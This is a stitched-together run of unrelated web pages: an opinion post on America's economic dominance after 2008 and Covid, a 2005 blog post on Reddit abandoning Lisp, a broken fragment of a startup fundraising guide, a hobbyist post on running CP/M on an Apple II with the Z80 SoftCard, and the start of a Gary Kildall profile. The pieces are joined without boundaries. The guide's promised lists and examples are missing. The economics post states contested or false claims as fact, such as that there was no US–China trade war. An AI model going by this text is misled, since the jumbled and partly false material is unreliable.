<p>Economically, a characteristic the post-2008 era is America solidifying its dominance globally in the aftermath of the 2008 crisis; for example, the increasing strength of the US dollar relative to the Euro, Pound, and emerging market currencies, whereas pre-2008 the US dollar was not that strong or such strength was cyclical. During the crisis and its aftermath, from 2008-2010, many pundits predicted a ‘post-America era’ or that America would take a backseat to Europe or China , but the opposite has happened, with America pulling way ahead of the rest of the world (with the possible exception of China) in terms of GDP growth, stock market gains, cultural and economic influence (such as Hollywood blockbusters grossing billons of dollars overseas, and rich Chinese flocking to the safety of the US housing market, pushing up up prices in Seattle and the Bay Area, to the chagrin of the media, who for years  have been complaining about housing being unaffordable, a 180-degree change in sentient from 2008-2011 when everyone was talking about falling prices), and tech innovation. Europe initially seemed to have exited the 2008 crisis in better economic shape compared to the US, but since 2010, similar to Japan’s 3-decade-long slump, has entered a period of prolong stagnation. </p>
<p>As shown below, since 2014, the US dollar index has been very strong. Although we cannot say how long this will last, I predict the dollar will remain strong for many years, even decades, to come. The Euro/US exchange rate, now at 1.17, will likely never revisit its pre-2008 highs.</p>
<p><img src="https://fred.stlouisfed.org/graph/fredgraph.png?width=880&amp;height=440&amp;id=TWEXB"></p>
<p>Increasing global uncertainty due to Covid and other factors, but also the weakening of foreign and emerging market economies, will likely create a strong demand for the dollar and treasury bonds due to ‘flight to safety’ trade, for the foreseeable future.  As bad as the US may seem–with BLM protests, increasing Covid cases and deaths, increasing political division and uncertainty about Trump, Biden, and China–much of the rest of the world is even worse in terms of economic weakness, unrest, and uncertainty. </p>
<p>For example, in July-September during the so-called ‘second wave’ of Covid cases, Trump was criticized heavily by the media and blamed for the resurgence of cases, but now Germany, Denmark, Spain, Norway, and other European countries, which were praised earlier in the year for seemingly having the virus under control, have all experienced massive second waves. Germany is now seeing record number of new daily cases, so this shows how even countries that initially seemed to be doing better than the US, have also succumbed to second waves. Moreover, as discussed <a href="http://greyenlightenment.com/right-again-covid-deaths-had-no-effect-on-stock-market/">earlier</a>, the stock market indexes of countries with fewer per capita Covid deaths as the US, such as Germany, have not outperformed the S&amp;P 500 since the pandemic began. </p>
<p>So this counters two media narratives: that the US handled Covid exceptionally poorly compared to the rest of the world [Germany's second wave shows that either Covid is very hard to contain regardless of competence or lack thereof of leadership and that second waves are inevitable; and or, that if Trump handled it incompetently, so did other leaders, but only that such incompetence manifested itself later (in September, October) rather than sooner (June, July) due to second waves being prolonged and delayed rather than averted completely. Germany was never able to prevent a second wave, but only delayed it due to aggressive social distancing measures early on]; and the second narrative: and that the US economy is lagging or weak  due to Covid (if we use the S&amp;P 500 as a proxy for economic health). As discussed above, S&amp;P 500 performance post-Covid is equal to that of Germany, which has had 80% fewer per-capita deaths as the US. The same pattern also holds for Sweden. But also, the S&amp;P 500 made new highs in October, as further evidence of Covid’s impact on the US economy only being temporary. So even if the media is right and Trump handled Covid poorly, the US economy still came out ahead of the rest of the world as further evidence of America’s economic dominance and strength in the post-2008 era, that even Covid could not undo.</p>
<p>Low US treasury yields, even lower than in the early 40s; but more importantly, how low yields have become permanent and the ‘new normal’. This trend has also been observed globally, with Western European countries such as Germany also having permanently low interest rates, even negative rates:   </p>
<p><img src="https://image.cnbcfm.com/api/v1/image/106413802-15837750747902020030810yrfrom1900.png?v=1583775102&amp;w=678&amp;h=381"></p>
<p>Permanently low inflation, but coupled with strong real GDP growth.  Just as interest rates are permanently low in the US, so is inflation, but unlike Western European countries or Japan, there is no deflation, and real US GDP growth remains strong, at 2-3% a year [The assumption by Krugman and other Keynesians is that low inflation must come at the cost of growth. This has been the case with Japan, but not the US]. This may not seem like much, but 2% real GDP growths exceeds that of South American economies, much of Europe, Japan, Turkey, the Middle East, Russia, and much of Asia. Sure, such the economies of the of the aforementioned countries may have more nominal GDP growth, but also much more inflation and collapsing or weak currencies, so the real, US-dollar adjusted growth is either flat or negative. Moreover, since 2008, the S&amp;P 500 has also outperformed all foreign peers by a huge margin.</p>
<p>As shown below, in terms of real GDP growth, the US has outperformed all developed economies since 2008 by a considerable margin:  </p>
<p><img src="https://i.imgur.com/olCeKrN.jpg"></p>
<p><img src="https://static.seekingalpha.com/uploads/2017/6/21/saupload_GDP.png"></p>
<p>Meanwhile, in spite of trillions of dollars  of spending under Trump and Obama (and endless predictions by the likes of Peter Schiff about dollar collapse, hyperinflation, and so on)–such as the 2008 bank bailouts, The American Recovery and Reinvestment Act, Obamacare, the Covid stimulus and bailouts, defense spending, healthcare, and much more to come–inflation just refuses to budge , at around 2% year. This is partly due to insatiable demand for low-yielding US debt, as creditors (such as pensions, corporations, wealthy individuals, sovereign wealth funds, and institutions) have nowhere else to park their money, and also that such spending is not really entering the US economy in terms of activity, but rather is being parked/saved or used to pay down existing debts. For example, in regard to the CARES Act, according to the NBER, “US households report spending approximately 40 percent of their stimulus checks, on average, with about 30 percent saved and another 30 percent used to pay down debt.” When Trump in early 2018 announced tariffs against China, the economic consensus at the time was that this would hurt the US economy and or cause high inflation. The media was, yet again, wrong on all counts: inflation did not budge, there was no trade war, there was no recession, and the stock market would go on to make new highs not long after. </p>
<p>As the rest of the world stagnates, since 2008 especially, the US has also pulled way ahead in terms of innovation and tech dominance, with mega-sized tech and retail companies such as Tesla, Google, Apple, Walmart, Visa, PayPal, Nike, Amazon, Zoom, Space-X, Facebook, Microsoft, Netflix, Uber, etc., having either been founded since 2008 or have seen their dominance and and market capitalization surge since 2008, even relative to the S&amp;P 500. The Nasdaq, which is composed of such tech companies, is the best-performing index of any developed economy since 2008 by a huge margin, and even exceeding its 90s performance even after factoring in the 90s tech boom (and such performance is magnified even more so by a backdrop of …</p></div></article></div>

November 3, 2020 | http://www.findinglisp.com/blog/2005/12/reddit-and-lisp-psychosis.html | <a href="https://web.archive.org/web/*/http://www.findinglisp.com/blog/2005/12/reddit-and-lisp-psychosis.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>I went away on a family vacation at the first part of this week and just got back last night. During that time, I completely missed the whole <a href="http://lemonodor.com/archives/001301.html">Reddit</a> <a href="http://pobox.com/~dnm/tdw/2005/12/contextinople.html">scandal</a>. It seems like the guys at Reddit ended up choosing to <a href="http://reddit.com/blog/2005/12/on-lisp.html">rewrite Reddit in Python</a> because Lisp just wasn't working for them. To some, this seems to be a slap in the face of Lisp. However, if you look at <a href="http://reddit.com/blog/2005/12/on-lisp.html">spez's blog entry</a>, you can see that the rationale for choosing Python was pretty sane.</p>

<p>In particular, this paragraph was interesting (also <a href="http://lemonodor.com/archives/001301.html">quoted by John at Lemonodor</a>):</p>
<blockquote>
Emacs and SLIME are a killer combination, but I develop on a Mac, and reddit.com is a FreeBSD box. On my Mac, my choices of threaded Lisp implementations was limited to OpenMCL, and in FreeBSD it's CMUCL. Because of the low-level socket and threading code we had to write, reddit would not run on my Mac, and I was always tethered to our FreeBSD development server. Not being able to program offline is a pain.
</blockquote>

<p>In a comment on <a href="http://lemonodor.com/archives/001301.html">Lemonodor</a>, Steve Huffman said:</p>
<blockquote>
The biggest trouble that plagued us was that we could never quite get Lisp reddit stable enough to sleep at night. There were weird threading issues that would bring the site to its knees a couple times a day and required constant monitoring.
</blockquote>

<p>Now, here's where the Lisp psychosis comes in. Rather than suggesting that the guys at Reddit were dopes, or that they didn't try hard enough, or that they should have done such and such a workaround, blah, blah, I wish Lispers would step up and internalize that the Reddit experience was a great case study and that the community should work to solve the issues it raised. These guys did not have a bad Lisp experience. In fact, they are quite complimentary of Lisp. For <a href="http://reddit.com/blog/2005/12/on-lisp.html">example</a>:</p>
<blockquote>
Lisp is an amazing language. After spending the entire summer working entirely in Lisp, it's nearly impossible to work in another language and not say to myself, "If only this were Lisp..." Lisp has many goodies that make programming in it a joy: the REPL, macros and the lack of syntax are some. I won't go into the details, but rest assured, it's cool. People become Lisp zealots for a reason.
</blockquote>

<p>So here's what I took away from the Reddit feedback:</p>
<ol>
<li>Lisp is a great language. Keep this point in mind. The Reddit developers gave Lisp compliments; they didn't 'diss it.</li>
<li>Lisp has a balkanized feature set. Some (necessary!) things to build modern applications are not cross-platform. When you have to work on multiple machines and environments, which is more and more the norm these days, there are no open source implementations of Lisp that run across the dominant environments without differences. (CLISP comes the closest, but you may or may not be able to tolerate its GPL license terms.) Because these features are not standardized, you're left writing compatibility layers if you want things to work across platforms.</li>
<li>In particular, networking and threading are problem areas.</li>
<li>Lisp libraries are scant. This is a well known problem in the Lisp community. The standard, basically valid, response is "Jump in and help us write some more libraries." (Kudos to Kenny Tilton for driving this line hard. He's right, but there's also a bit more to it than that.)</li>
<li>The library problems are compounded by the balkanization of feature set. In some cases you can find something that sort of works, but it may work on another implementation, not yours. If it has any dependencies on the problem areas of threads and networking, you've got a long road of tweaking ahead to get it to work. This time is better spent getting on with your real task.</li>
<li><a href="http://weitz.de/">Edi Weitz</a> (yet again) wins the Lisp Superhero award for creating the best libraries out there, bar none. Seriously, if anybody aspires to create libraries that are well-used, go take some cues from Edi. His code is always high quality, his APIs and implementations are always complete, he's absolutely responsive to problem reports, he provides great documentation, and he often tests his code across multiple implementations, trying to make them as cross-platform as possible. In short, you couldn't expect better service and support from a commercial vendor, and Edi releases his code as open source.</li>
</ol>

<p>Okay, all that said, what's the constructive response here? My suggestions are:</p>
<ol>
<li>First, stop grumbling and suggesting workarounds to the Reddit folks. They did the Lisp community a great service by documenting their experiences. Rather than harrassing them, sit down and talk with them to get more info.</li>
<li>Next, focus on the foundational balkanization problems. In my opinion, the biggest issues with Lisp are the lack of standard (defacto or otherwise) networking and threading APIs. If those were in place, it would be a lot easier to get libraries that worked all over the place. Would this solve everything? No, but it would go a long way and would enable lots of other innovation on top of that foundation instead of having everybody spending time creating compatibility libraries and generally re-inventing the wheel.</li>
<li>Work on getting a good cross-platform, open source Lisp implementation with a liberal license. Like I said previously, I really like <a href="http://clisp.cons.org/">CLISP</a>, and I use it for developing on Windows, but the license is not suitable for all code since it all-but-forces your code to be released as GPL. I'd really love to see <a href="http://www.sbcl.org/">SBCL</a> or <a href="http://www.cons.org/cmucl/">CMUCL</a> ported to Windows, with the full set of functionality. I'd also love to see SBCL's baseline functionality present on all platforms (currently threading only works on Linux, for instance, not BSD). By the way, this is no knock on any other Lisp implementation. I just happen to use SBCL on Linux and think it rocks. If <a href="http://openmcl.clozure.com/">OpenMCL</a> can make the jump off of Mac onto other platforms, that would be great. Or maybe <a href="http://www.gnu.org/software/gcl/gcl.html">GCL</a> can do the job. I don't know the exact route, but the fact is the lack of a baseline functionality across all platforms is hurting us.</li>
</ol>

<p>Can I do all the above? Nope. I've tried grokking the internals of SBCL and I'm only qualified to kibitz around the margins. I stand in awe of guys like William, Christophe, Dan, Nikodemus, Gabor, Juho, Alexey, and many others (Update: I added to this list twice already because I felt so bad for leaving out somebody's name--sorry William and Nikodemus. If you're a significant SBCL contributor--or even and insignificant one--believe me when I say I stand in awe of you too ;-). I do try to help out SBCL by reducing the friction for newbies to get started with Lisp, compiling the RPM binaries that are available on <a href="http://sourceforge.net/projects/sbcl/">SourceForge</a> and maintaining the <a href="http://www.fedoralisp.org/">FedoraLisp.org</a> Yum repository.</p>

<p>That said, I'm going to start working on the networking API issues. You'll see a document from me posted over the next couple of weeks. It's been in process for a few months, but I finally got a hankering to finish it with this Reddit bru-ha-ha. If you're interested in networking APIs and have a desire to help in such an endeavor, please drop me a line (dave at findinglisp). I'd love to spread the work around. If somebody else wants to grab the threading stuff by the throat that would be great.</p>

<p>Above all, stay productive. Use the Reddit feedback to motivate you to make Lisp better. Whatever you do, stop suggesting workarounds to the Reddit guys or making them feel bad for the choices they made. They seem like smart guys, so let's assume that they did what they did knowing all the options (they do have <a href="http://www.paulgraham.com/">Paul Graham</a> on the board, so I'm guessing that they talked about this before they did the rewrite). They have moved on and our job is to make any such workaround unnecessary for the next crew that tries to use Lisp.</p>

<p>And before anybody says it, yes I know that the commercial Lisp vendors have solved some of these problems. I have discussed before <a href="http://www.findinglisp.com/blog/2004/11/more-rad-thoughts.html">some of my thoughts about the various license terms the vendors use</a>. It isn't that those terms are bad in the abstract, they just don't allow those implementations to solve the problem I'm interested in. In short, I think it would help drive Lisp adoption if a common, cross-platform, free, open source version existed, in the same way that GCC has helped democratize programming in C. The next-best alternative would be a $99 "Turbo Lisp" environment ala Borland's language products in the 1980s/1990s. Perhaps the <a href="http://www.lispworks.com/">Lispworks</a> guys will offer such a thing (hint, hint ;-).</p><br>

<p><span>Once you’ve developed that relationship, and it’s time to ask for that all-important injection of capital, you need to showcase what you have to offer.&nbsp;</span></p>
<h3><span><i><span>Investors need to see that </span></i><b><i>you</i></b><i><span>, the team you assemble and your product are a good bet that will bring in a good ROI.</span></i></span></h3>
<p><span>That means you need to:&nbsp;</span></p>

<p><span>Here I wanted to take a moment to outline some examples of the documents needed to create a financial plan.&nbsp;</span></p>
<p><span>Please note that different industries have different accounting structures. For example, the financial documents of a lending startup are very different from a company that produces hardware.&nbsp;</span></p>
<p><span>I recommend taking a short accounting course on </span><a href="https://www.udemy.com/course/finance-and-accounting-for-startups/?gclid=EAIaIQobChMI0urvw5vv6AIVzNDeCh3tjwXdEAAYASAAEgJ0L_D_BwE&amp;matchtype=b&amp;utm_campaign=Accounting_v.PROF_la.EN_cc.ROW_ti.4328&amp;utm_content=deal4584&amp;utm_medium=udemyads&amp;utm_source=adwords&amp;utm_term=_._ag_83158989595_._ad_395282384333_._kw_%2Baccounting+%2Bbasic_._de_c_._dm__._pl__._ti_kwd-716117810837_._li_1011742_._pd__._" target="_blank" rel="noopener noreferrer"><span>Udemy</span></a><span> – alternatively, ask a friend who is knowledgeable on the topic.</span></p>

<p><span>The profit and loss statement is a document that states revenues and expenses within a certain accounting period (a year for example).&nbsp;</span></p>
<p><span>It is created to understand the profit and losses that are incurred by the startup. There are many models for profit and loss statements – here’s an example of one model:</span></p>
<figure><img loading="lazy" src="https://cdn-images-1.medium.com/max/1440/0*zDcJN8v9ema3lfrf" alt="Example of a Profit &amp; Loss Model" width="395" height="287" data-image-id="0*zDcJN8v9ema3lfrf" data-width="395" data-height="287"></figure>
<p><span>At the early stage of your startup, you only need this to prove that the core of your business will be viable or to identify the break-even point, for instance. In conclusion, I wouldn’t recommend going into too much detail on this at the early stages or you risk falling into an infinite loop of assumptions.&nbsp;&nbsp;</span></p>
<h4><span>Balance Sheet</span></h4>
<p><span>Your balance sheet is a statement of what the company owns, in terms of assets, and owes, in terms of liabilities and equity.&nbsp;</span></p>
<p><span>In a nutshell: equity + liabilities = assets. Here’s an example of a balance sheet:</span></p>

<h4><span>Cash Flow Statement&nbsp;</span></h4>
<p><span>The cash flow statement shows how changes in the balance sheet accounts and income affect cash and cash equivalents.&nbsp;</span></p>
<p><span>It also breaks down the analysis into operating, investing and financing activities. Here’s an example of how to calculate cash flows:</span></p>

<h3 id="appendices"><span>Appendices</span></h3>
<p><span>Finally, you should include any supporting documents that back up any assumptions and descriptions that you have outlined in previous sections.&nbsp;</span></p>
<p><span>Once you have your business plan and financials in place, it’s time to create your pitch deck.&nbsp;</span></p>

<h2 id="an-engaging-pitch"><span>An Engaging Pitch</span></h2>
<p><span>When you pitch to investors, you’ll have between 10 and 40 minutes to do one thing.&nbsp;</span></p>
<h3><span><i><span>Your pitch needs to sell investors on the idea that you and your startup represent an opportunity for them to reap significant returns</span></i><i><span>.</span></i></span></h3>
<p><span>For every </span><a href="https://www.entrepreneur.com/article/251311#:~:text=For%20every%201%2C000%20pitches%20an,turns%20heads%20and%20gets%20funded." target="_blank" rel="noopener noreferrer"><span>1,000 pitches an investor hears, they will fund only 100 of them</span></a><span>. The first step in being one of the 100 is to compel them to open their wallets.</span></p>
<h3 id="how-to-compel-investors"><span>How to Compel Investors</span></h3>
<p><span>Put yourself in the right room. That is to say, find investors who have money and an interest in your startup. If you </span><a href="https://altar.io/raising-capital-for-a-startup-first-steps-to-a-great-deal/" target="_blank" rel="noopener noreferrer"><span>can’t figure out a way to get a warm introduction with investors</span></a><span> how can you figure out how to reach your customer?</span></p>
<p><span>You have to remember </span><span>a pitch is not designed to raise money</span><span>. It is just a way to get a “second date” with your potential investors.&nbsp;</span></p>
<h3><span><i><span>A great pitch needs to answer two questions: “</span></i><b><i>Why You?</i></b><i><span>” and “</span></i><b><i>Why Now?</i></b><i><span>”.</span></i></span></h3>
<p><span>What is it about you and your team uniquely qualified to execute this idea and why is it relevant now?</span></p>
<p><span>Those two questions alone, however, are not enough. Three unspoken questions need to be answered – and they have nothing to do with your presentation or data.&nbsp;</span></p>
<p><span>They have </span><span>everything</span><span> to do with the investor’s perception of </span><a href="https://altar.io/what-startup-investors-look-for-in-entrepreneurs-and-their-teams/" target="_blank" rel="noopener noreferrer"><span>you, your team</span></a><span> and your idea.&nbsp;</span></p>
<p><span>The first unspoken question is “</span><span>Do I think this will work for me?</span><span>”&nbsp;</span></p>
<p><span>Investors need to see how your startup fits with the other companies in their portfolios. Furthermore, they need to know that </span><b>they can bring something to your company</b><span> – besides a cash injection.&nbsp;</span></p>
<div>
<h4><span>An Investor’s Advice</span></h4>
<p><i><span>“You want to keep investors who really know your industry up to date weekly. Genuine investors can help you and want to work on your success — they’re not just a check.”</span></i><span>&nbsp;</span></p>
<p><span>Paul O’Brien – CEO of MediaTech Ventures.</span></p>
</div>
<p><span>The second and third questions they will ask themselves are all about </span><b>you and your co-founder(s)</b><span>.&nbsp;</span></p>
<p><span>They are “</span><strong>Do I like you?</strong><span>” and “</span><strong>Do I trust you?</strong><span>” and the answers can make or break your chance of getting their backing.</span></p>
<p><span>To successfully get the coveted “second date” your pitch needs to have:</span></p>
<ol>
<li><span>A clear business plan as outlined in your Pitch Deck.</span></li>
<li><span>Communicated through a compelling presentation filled with interesting stories and not dry facts</span></li>
<li><span>Delivered with confidence, passion and clarity</span></li>

<p><span>Above all “Brevity is the soul of wit”. Communicate your knowledge, intelligence, wisdom and humour as succinctly as possible.&nbsp;</span></p>
<h3 id="essentials-of-a-great-pitch"><span>The Essentials of Your Great Pitch Deck</span></h3>
<p><span>The goal of your pitch deck is to show the essence of your business in 10 to 15 slides – with as few bullet points as possible.&nbsp;</span></p>
<p><span>To get started, here is an outline of the slides you should include:&nbsp;</span></p>

  <div itemprop="articleBody">
    <p>So there I was, very happy with my <a href="http://nicole.express/nicole-buys-stuff-apple-ii-plus.html">Apple ][<sub><i>plus</i></sub></a>. But then I saw someone on the internet post, and it seems that my Apple is an overpriced box with a toy microcontroller for a CPU, while <em>real</em> computers use an Intel 8080, 8085 or Zilog Z80 to run something called “CP/M”… but I’ve already spent so much money on the Apple, so can I turn it into a real computer?</p>

<h2 id="microcontroller-says-what">Microcontroller says what?</h2>

<p><img src="http://nicole.express/assets/img/softcard/glory6502.jpg" title="BEHOLD" alt="The Apple II plus circuitboard, with its 6502 in the center"></p>

<p>First off, is the 6502 a microcontroller? Eh, not by modern standards, with no inbuilt ROM or RAM and no IO. But at the time of its release, MOS Technology definitely saw usecases we’d call “embedded” today as part of the processor’s mission. And if you buy a <a href="https://www.westerndesigncenter.com/wdc/w65c02s-chip.php">65C02</a> today from the Western Design Center, you’re probably using it for that. Or for a hobby machine, I suppose.</p>

<p><img src="http://nicole.express/assets/img/softcard/z80time.jpg" title="I don't know who put that sticker there, but it's history now" alt="The Z80 CPU on the Apple softcard"></p>

<p>But the same is also true of the Z80. And yeah, you can get those today straight from <a href="https://www.zilog.com/index.php">Zilog</a> themselves. Good thing for TI; gotta keep that <a href="https://education.ti.com/en/products/calculators/graphing-calculators/ti-83-plus">graphing calculator</a> racket going. Insulting 8-bit processors by calling them microcontrollers, in this, the year 2020? That’s the only thing that keeps them going!</p>

<h2 id="back-to-the-1970s">Back to the 1970s</h2>

<p>But let’s take a look at the historical view to understand where my angry internet commenter friend might be coming from.</p>

<p>Today, many computer historians date the microcomputer era as starting in 1977 with the “Trinity” (a term which may not have been used at the time, but is definitely used now) of the Commodore PET, the Tandy/Radio Shack TRS-80 Model I, and the Apple ][. Two of these machines were 6502-based, and one was Z80-based. None of the three could run CP/M. (Some later TRS-80 computers could, but what Tandy did to the TRS-80 brand…)</p>

<p>But some might go back to 1974, with the Altair 8800. Nope, of course I don’t have one of those. In 1974 there were no Z80s or even 6502s; the Altair used the Intel 8080, an 8-bit design that was one of the first real heavily used microprocessors. It used a <a href="https://en.wikipedia.org/wiki/S-100_bus">100-pin bus</a> that somehow managed to get in the hands of the military, ensuring support until the 1990s.</p>

<p>The Altair 8080 spawned a whole series of clones which used the same CPU (or the later Intel 8085 and Zilog Z80, which could run the same software, but required less support circuitry and added some features), but all these clones had slight differences; some would output through a teletype or serial terminal. Maybe others had a graphics display. Disk drives were still in the throes of shifting from 8” to the 5.25” disks we now call “big”, but they called “mini”.</p>

<p>And that was what CP/M was for: a <b>C</b>ontrol <b>P</b>rogram and <b>M</b>onitor that could be ported to any of these machines, and paper over those differences for software. That’s still what operating systems do today. But the basic requirements were RAM in the right places (Tandy failed that one), and an Intel 8080-compatible CPU (Apple and Commodore whiffed that one).</p>

<p>So if you had been a microcomputer enthusiast or a business that was an early adopter in 1977, you might be a little miffed at the “Trinity”; sure, they were cheaper and more accessible than the expensive S-100 bus machines, and were a complete package, but they also ignored all the standards and were incompatible with all your software.</p>

<p><img src="http://nicole.express/assets/img/softcard/badge.jpg" title="It's just pretty" alt="The Apple II plus exterior, focusing on the logo"></p>

<p>But this is a blog post about the Apple ][. An illustrious line of computers that would outlive its competition. And it did that through its expandability. Who needs S-100 when we have A-50?</p>

<h2 id="enter-microsoft">Enter… Microsoft?</h2>

<p><img src="http://nicole.express/assets/img/softcard/notsosoft.jpg" title="Can you imagine a world where everything is done with 74xx logic" alt="The Z80 Softcard, with a rockin' Microsoft Consumer Products logo"></p>

<p>That logo on the Z80 SoftCard might surprise you. How on earth did Microsoft have such an awesome logo in the 1970s, and why would they ever give it up? Also, why are they making Apple parts?</p>

<p>Well, Microsoft was the largest vendor of BASIC, a programming language that was available all over (my Apple ][plus has Microsoft BASIC in ROM), but had made its initial start on the Intel 8080 machines. So perhaps that’s why they decided to sell a card, to allow users access to the pre-existing ecosystem they had helped build. And it’s not even the only Microsoft card in my Apple!</p>

<p>The card was, according to Wikipedia, designed by Tim Paterson, who at the time worked for Seattle Computer Products, a hardware company that Microsoft often worked with in those days. He was also clearly a CP/M fan; when the official port to Intel’s new 8086 16-bit CPU was delayed, he wrote his own clone– a clone which became MS-DOS. So this card has quite a pedigree!</p>

<h2 id="install-the-card">Install the card</h2>

<p><img src="http://nicole.express/assets/img/softcard/slots.jpg" title="I need more cards" alt="The Apple II plus circuitboard, showing its cards"></p>

<p>So now we install the card. This is a pretty typical, if bare, setup, with a Microsoft RAM card in slot 0, and a 5.25” Disk Controller in slot 6. But the interesting thing is, this isn’t what Woz expected. Apple documentation of the time suggests that cards be added from left to right to allow the DMA priority lines (more on what that means later) to be continuous. Cards were supposed to be able to inhabit any slot; writing position-independent code is a bit hard on the 6502, but it’s not impossible.</p>

<p><img src="http://nicole.express/assets/img/softcard/softcards.jpg" title="You think this is bad, look at S-100" alt="From the Microsoft SoftCard documentation, explaining the slot layout"></p>

<p>Perhaps because of that difficulty, Microsoft decided to create a standard arrangement of cards. I’m not actually sure if this originated with Microsoft, but the SoftCard documentation is the earliest I can find it.</p>

<p><img src="http://nicole.express/assets/img/softcard/iigs.jpg" title="Isn't this blog post about your II plus" alt="The Apple IIgs control panel, showing the default slot layout"></p>

<p>A memory expansion card in slot 0, a printer in slot 1, an IO device in slot 2, an 80 column card in slot 3, and disks in 5 and 6, with 7 being any type. That might seem familiar to a user of the Apple IIgs. (The Apple IIgs has a full contingent of slots, but maps its built-in hardware to the memory addresses of the original slots for backwards compatibility) Sure, they didn’t see the need for a mouse in 1980, but who did? (Xerox, yes) In any case, this card arrangement was pretty much standard among Apple users by the early-to-mid 1980s.</p>

<p>I want to run the CP/M card on my period-appropriate machine; not the IIgs, but the Apple II plus. Today, it’s hooked up to the Monitor ///; CP/M software doesn’t need color. In fact, this is a fairly period-accurate setup. While the Apple /// was not a huge success, its monitor seems to have been.</p>

<p><img src="http://nicole.express/assets/img/softcard/monitor3.jpg" title="Probably because it looks awesome" alt="The Monitor III sitting on the Apple II plus"></p>

<h2 id="turn-it-on">Turn it on!</h2>

<p><img src="http://nicole.express/assets/img/softcard/nada.jpg" title="It's still a cool boot screen" alt="The standard Apple II boot screen. Nothing's changed"></p>

<p>The Apple ][plus, with the Z80 Softcard installed, still boots to its normal Autostart ROM, waiting for you to insert a disk. It’ll boot those disks like normal, and if you press reset, you can end up in Applesoft BASIC.</p>

<p><img src="http://nicole.express/assets/img/softcard/laz80.jpg" title="Shh it can hear us, it's on the bus" alt="Applesoft BASIC, with a simple program that prints 'Wow, that lazy Z80 isn't doing anything'"></p>

<p>But of course, this is exactly how you’d want it. You wouldn’t want to suddenly lose all compatibility with 6502 software; in fact, the Z80 goes to great pains to keep compatibility, as we’ll see later. Things only change once you insert a CP/M boot disk.</p>

<p><img src="http://nicole.express/assets/img/softcard/oopsi80.jpg" title="see nicole you made it mad" alt="A boot message CANT FIND Z80 SOFTCARD"></p>

<p>Oops. Those slots are around 30 years old, some contact cleaner couldn’t hurt. And notice that it drops you in the ROM monitor (the “*” prompt) rather than BASIC. (Integer BASIC had a “&gt;” prompt, and Applesoft a “]” prompt) In this case, it probably just did a <code>BRK</code> opcode. You can get the same behavior in your own problems, which can be helpful in debugging.</p>

<p>Anyway, one deoxit later, and…</p>

<h2 id="enter-apple-cpm">Enter Apple CP/M</h2>

<p><img src="http://nicole.express/assets/img/softcard/cpmboot.jpg" title="I'm sure Microsoft will never get into a massive lawsuit with the creators of CP/M" alt="A boot message APPLE ][ CP/M"></p>

<p>And here we are! This is a “&gt;” prompt, but it’s not Integer BASIC. You’ll find none of your familiar Apple DOS or ProDOS (which didn’t even exist yet) commands like <code>CATALOG</code> will help you here.</p>

<p><img src="http://nicole.express/assets/img/softcard/catalogdir.jpg" title="this prompt will never catch on" alt="The CP/M prompt"></p>

<p>The CP/M prompt is a lot like the DOS prompt. And that shouldn’t surprise you; after all, MS-DOS started out as a clone of CP/M. Familiar commands like <code>DIR</code> to list a directory and <code>TYPE</code> to print out a file exist here too. But it’s a very early ancestor; things like directories don’t exist just yet. The COM files are executables, just like in MS-DOS; EXE files aren’t a thing.</p>

<p>And you’ll see <code>MBASIC</code>. (and <code>GBASIC</code>, a variant that supports Apple ][ high-resolution graphics) That’s right, this contains the Z80 version of Microsoft BASIC. And they even customized it for the Apple ][, which is pretty neat.</p>

<p><img src="http://nicole.express/assets/img/softcard/basic80.jpg" title="No prompt at all!" alt="Microsoft BASIC for the Z80"></p>

<p>Notice that there are only 14195 bytes free in RAM. Unlike Applesoft, which resides in ROM, CP/M <code>MBASIC</code> has to live in the free RAM, and CP/M’s OS facilities take up even more of that space. So this takes up a lot of space that could be used for your programs. But hey, the manual says it’s better.</p>

<p><img src="http://nicole.express/assets/img/softcard/mbasicman.jpg" title="Not biased" alt="MBASIC's description in the Softcard manual. It says 'This is Microsoft BASIC. This version of BASIC is disk BASIC that supports low-resolution graphics, sound, and game controls in addition to many features not found in Applesoft. This version does not support high-resolution graphics."></p>

<p>By the way, <code>GBASIC</code>, which does support high-resolution graphics, only gives you 5105 free bytes for your program. Hey, it still beats a stock VIC-20.</p>

<h2 id="lets-benchmark-this">Let’s ‘benchmark’ this!</h2>

<p>So, we have BASIC. This means that we can run our notoriously terrible benchmark, the Nicole Simulator! (For some history, this originated in my <a href="http://nicole.express/2018/replacing-the-cpu-in-a-tandy-1000-hx.html">Tandy 1000HX</a> blog post).</p>

<p>The Z80 in the Softcard is clocked at 2.041 MHz (it’s a little more complicated than that, as Apple ][ timing is a bit of a mess), which is similar to the clock speed the RAM runs at. That’s a bit slow for Z80, but remember that this test, a simple BASIC program, is primarily limited by the ability to put characters on screen. And the Apple ][ is very good at that.</p>

<p><img src="http://nicole.express/assets/img/softcard/nicode.jpg" title="Basically this is all I do" alt="A simple BASIC program which prints 'NYA' 10,000 times"></p>

<p>Fun fact: I initially wrote that first line <code>FOR I=1TO10000</code>, but something wanted the spaces. Not sure what; spaces are usually not required in BASIC, as you can see on the <code>20 PRINT"NYA"</code> line.</p>

<p>In any case, here’s the result!</p>

</table>

<p>Very nice! The overhead of having to go through CP/M to write on screen doesn’t help compared to the stock bare-metal Applesoft routines, but this is still a great showing.</p>

<p>You might wonder why it does so much better than the <a href="http://nicole.express/2019/8bit-battle-tandy-sega.html">Sega SC-3000</a>. And honestly, I don’t know why the SC-3000 bombed <em>that</em> badly, but the fact that both it and the NES had comparable slow speeds makes me think that it has something to do with the fact that those systems can only access Video RAM during limited intervals, and don’t have direct access to it. (This is also how CGA works, but the beefier processors help there)</p>

<p>Still, this was way faster than I expected. Good on you, Z80.</p>

<p>The tech world brims with stories of triumph, showmanship, betrayal and deceit. But this is not one of those stories. This is a story of fate and confusion undoing what might have been a great testimony of <a rel="noreferrer noopener" aria-label="entrepreneurship (opens in a new tab)" href="https://bookjelly.com › category › entrepreneurship" target="_blank">entrepreneurship</a>. This is the story of Gary Kildall. </p>



<p>There was a time in the tech world when very few doubted Gary’s ascension until all of sudden things started crumbling before screeching to a heartbreaking halt. </p>



<p>What happened in between can best be described as a fateful turn of events.</p>



<p>In case you are still wondering who the heck this Kildall guy is, well, he was someone who could have been a multi-billionaire had he been in the right place at the right time. </p>



<p>He was someone who could have been as famous as Bill Gates had he played his cards right. </p>



<p>He was a tech visionary – a central figure in the development of personal computing in the ’70s and the early ’80s. </p>



<p>Gary started his career as a mathematics professor at Naval Post Graduate School in Monterey, California. With his background in mathematics, he started to lean towards programming. In 1972, he completed his Ph.D in Computer Science and started consulting for Intel. </p>



